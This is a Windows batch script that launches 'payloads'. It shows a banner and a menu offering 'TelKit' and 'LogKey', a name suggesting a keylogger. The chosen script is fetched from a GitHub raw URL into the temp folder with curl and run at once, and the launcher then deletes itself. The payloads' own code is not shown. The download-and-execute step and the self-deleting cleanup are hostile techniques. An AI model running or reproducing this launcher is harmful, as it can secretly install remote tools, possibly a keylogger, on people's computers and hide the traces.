@echo off
title Payloads

:: Config variables
set "debug=0"
set "folder=%temp%"
set "file=r.bat"
set "dir=%folder%/%file%"
set "prefix=https://raw.githubusercontent.com/Jed556/Payloads/main/"

if "%2"=="1" (
    set "debug=1"
)

:Art
cls
echo.
echo. [0;34m"|     [1;36m /#######  /##                     [0m                                          [0;34m|"[0m
echo. [0;34m"|     [1;36m| ##__  ##| ## [0;36m  /#######  [0m                                                  [0;34m|"[0m
echo. [0;34m"|     [1;36m| ##  \ ##| ## [0;36m /##_____/  [0m        [1;37mPayloads[0m by Jed556[0m                        [0;34m|"[0m
echo. [0;34m"|     [1;36m| #######/| ## [0;36m |  ######  [0m        [4mGitHub.com/Jed556/Payloads[0m                [0;34m|"[0m
echo. [0;34m"|     [1;36m| ##____/ | ## [0;36m  \____  ## [0m        [1;32mLauncher[0m                                  [0;34m|"[0m
echo. [0;34m"|     [1;36m| ## [0;36m /#################/  [0m                                                  [0;34m|"[0m
echo. [0;34m"|     [1;36m|__/ [0;36m/_________________/   [0m                                                  [0;34m|"[0m
echo.

:Selection
    if [%1]==[] (
        echo Payloads
        echo [1;37m[1][0m TelKit
        echo [1;37m[2][0m LogKey
        echo [1;37m[3][0m GitHub ^(Docs^)
        echo.
        set /p "input=Enter payload index: "
    ) else (
        set "input=%1"
    )

    if %input%==3 (
        echo Opening GitHub...
        start https://GitHub.com/Jed556/Payloads
        echo [1;32mOpened GitHub[0m
        timeout /t 30
        goto Art
    )

    if %input%==1 (
        set "src=Telkit/telkit.bat"
        goto Curl
    )

    if %input%==2 (
        set "src=Logkey/logkey.bat"
        goto Curl
    )

    echo Invalid input. Press any key to try again...
    pause > nul
    goto Art

:Curl
    set "url=%prefix%%src%"
    for /f "tokens=1 delims=/" %%a in ("%url%") do set "payload=%%a"
    echo Downloading %payload%...
    shift
    cmd /c curl -Lo %dir% %url% & %dir% %*
    echo Launched

:End
    echo.
    echo Bye...
    timeout /t 2 > nul
    del /Q /F "%~f0" & exit